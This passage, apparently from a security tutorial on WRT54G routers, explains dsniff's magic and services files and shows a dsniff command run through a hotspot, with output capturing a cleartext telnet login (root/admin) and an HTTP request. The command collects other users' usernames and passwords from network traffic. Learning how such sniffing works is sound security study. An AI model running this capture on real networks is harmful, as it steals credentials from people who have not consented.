    Once you''ve installed dsniff, you should be aware of two files:


    **usr/lib/dsniff.magic** This file contains the regular expressions that correspond
    to the packets containing the passwords for a given protocol. For example, the
    line 0 *string AUTH pop* specifies that the offset in the packet is 0, it is of
    type *string*, searches for the string AUTH, and it displays a message of pop.
    This is a standard file format definition. For more information, you can type
    *man 5 magic* on UNIX/Linux host.


    **usr/lib/dsniff.services** This file describes the services that dsniff uses,
    and it is structured like the /etc/services file on any UNIX/Linux host.


    By modifying these two files, and using the -m parameter to dsniff, you can grab
    usernames and passwords from many different protocols. Let''s look at how we would
    run dsniff to collect usernames and passwords in clear text through our hotspot
    (or any other WRT54G):


    ```

    # dsniff -dmn -s5100 -i eth1

    <snip>

    dsniff: trigger_set_cap: port 8080 -> http

    dsniff: trigger_set_cap: port 8888 -> napster

    dsniff: trigger_set_cap: port 9898 -> aim

    dsniff: trigger_set_cap: port 65301 -> pcanywhere

    dsniff: trigger_set_rpc: program 100005 -> mountd

    dsniff: listening on eth0


    [ 0 belong=0,""]

    dsniff: trigger_cap: decoding port 23 as telnet


    ----------------------------------------------------------------------


    01/13/00 23:16:35 tcp 192.168.1.249.39866 -> 192.168.1.1.23 (telnet)

    root

    admin


    ----------------------------------------------------------------------

    n01/13/00 23:18:26 tcp 192.168.1.249.58937 -> 192.168.1.42.80 (http)

    GET /cgi-bin/webif/ HTTP/1.1

    ```


    Continued'
